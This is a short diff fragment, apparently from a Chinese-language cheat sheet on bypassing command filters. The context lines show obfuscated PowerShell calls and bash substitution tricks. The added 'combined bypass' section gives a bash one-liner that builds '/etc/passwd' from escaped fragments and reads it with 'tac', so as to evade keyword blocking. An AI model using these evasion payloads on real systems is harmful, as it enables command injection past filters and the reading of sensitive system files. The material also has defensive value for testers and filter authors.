@@ -110,3 +110,9 @@ cat ${test//hh??hm/}
 powershell C:\*\*2\n??e*d.*? # notepad
 @^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
 ```
+
+## 组合绕过
+
+```bash
+g="/"e\t\c"/"p\a"ss"wd"";tac$@<${g//hh??hm/}
+```
